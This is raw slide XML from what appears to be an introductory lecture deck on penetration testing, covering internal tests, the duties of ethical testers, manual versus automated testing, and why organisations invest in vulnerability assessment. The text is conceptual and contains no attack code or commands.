            <a:pPr marL="0" lvl="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Arial" panose="020B0604020202020204"/>
              <a:ea typeface="Arial" panose="020B0604020202020204"/>
              <a:cs typeface="Arial" panose="020B0604020202020204"/>
              <a:sym typeface="Arial" panose="020B0604020202020204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Internal pen test</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buSzPts val="1500"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>In an internal test, the ethical hacker performs the test from the company’s internal network. This kind of test is useful in determining how much damage a dissatisfied employee can cause</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>from behind the company’s firewall.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;197;p27">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2C66A2F3-A090-A47F-53A6-6BF23F5F9515}"/>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Calibri" panose="020F0502020204030204"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
                <a:sym typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Contd...</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1379878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5C555F8-6942-EE51-9971-71F4E1358E91}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;204;p28">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B33C7690-7F34-AC2D-0EBE-39237A4F9475}"/>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Contd...</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Google Shape;206;p28" descr="What is Penetration Testing❓ Definition, Stages, Techniques, Pros and Cons">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6FA5AA58-3B7A-4461-BECA-5C9630EE0A0D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr preferRelativeResize="0">
            <a:picLocks noGrp="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="2249992"/>
            <a:ext cx="7886700" cy="4095629"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2822859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AA5E178-BA3E-E0D9-BAD0-5AC74A995222}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">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Testers should collect required information from the Organization to enable penetration tests.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">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Find flaws that could allow hackers to attack a target machine.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">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Pen Testers should think &amp; act like real hackers a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>lthough </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>ethically.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">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Work done by Penetration testers should be reproducible so that it will be easy for developers to fix it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">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Start date and End date of test execution should be defined in advance.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">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A tester should be responsible for any loss in the system or information during the Software Testing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">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A tester should keep data and information confidential.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;213;p29">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{02DBAA9F-65B4-8210-2E8B-EE7AE2E9CF8C}"/>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Roles and Responsibilities of Penetration Testers</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="370470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C96744-D15C-26D0-6CD4-6BC579C8DAC4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>A software/ tool cannot map the way a human mind works especially when it comes to looking at multiple possibilities, each with multiple options.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;224;p30">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9FF4E5C4-F4B1-9CBA-4DD8-33EE601A87C4}"/>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Penetration testing: Manual vs. Automated</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{21E19EC8-ACE4-37C1-83A2-0D87AE97CF24}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1173276" y="3429000"/>
            <a:ext cx="6974428" cy="2755631"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2821246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505146-3515-EB57-124A-108B4280ACBD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" lvl="1" algn="just">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="5B9BD5"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:sysClr val="windowText" lastClr="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Basic security measures are not enough.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="5B9BD5"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:sysClr val="windowText" lastClr="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Firewalls or anti-virus solutions are not sufficient to protect against attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="5B9BD5"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:sysClr val="windowText" lastClr="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Security budget</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:sysClr val="windowText" lastClr="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>; Unlike MNCs, Organizations do not have the budget to implement everything.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="5B9BD5"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:sysClr val="windowText" lastClr="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>There is limited or no resource for security expertise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="5B9BD5"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:sysClr val="windowText" lastClr="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>What VAPT adds value to is to streamline what is needed for the organization.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="5B9BD5"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:sysClr val="windowText" lastClr="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Reputation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:sysClr val="windowText" lastClr="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>; a small data breach can ruin organization’s reputation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;236;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CC9E7001-5461-29E9-F11A-C8B58DC7550E}"/>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Importance of Penetration testing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1842400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1D31CB6-5B1E-3736-BA64-98E6A5967693}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent1"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Potential clients or b</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>usiness partners will feel insecure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t> on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>collaboration</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent1"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Contributing factors can be issues like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>safeguard of important data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent1"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Organizations also </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>lose out on potential</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>/existing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>business</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" algn="just">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent1"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>Compared to small or medium organizations, larger organizations have a much greater potential to survive an attack due to the help of current investors and existing large clients. E.g. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" u="sng" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Sony (04/2011) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204"/>
                <a:ea typeface="Arial" panose="020B0604020202020204"/>
                <a:cs typeface="Arial" panose="020B0604020202020204"/>
                <a:sym typeface="Arial" panose="020B0604020202020204"/>
              </a:rPr>
              <a:t>survived through the attack.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;247;p32">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{726A7191-4420-61C6-00A9-E539EF74C23A}"/>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Contd...</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2812028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8BDEEBE-57B5-9D01-4E01-83FD49B0F535}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Google Shape;258;p33">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FBF39E60-D48F-77A6-D1AD-D3F5D5677D6A}"/>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Calibri" panose="020F0502020204030204"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204"/>
                <a:sym typeface="Calibri" panose="020F0502020204030204"/>
              </a:rPr>
              <a:t>Contd...</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Google Shape;260;p33" descr="31 Mike Tyson Quotes On Being A Champion - Take Your Success">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{867468CD-BE0E-8E8C-9A3D-647508F0FAA5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr preferRelativeResize="0">
            <a:picLocks noGrp="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph type="body" idx="2"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="628650" y="2249992"/>
            <a:ext cx="7886700" cy="4095629"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2161560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FD61404-504A-3918-895F-75280913FA7D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" lvl="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="accent1"/>
              </a:buClr>
              <a:buSzPts val="2400"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="⮚"/>
            </a:pPr>
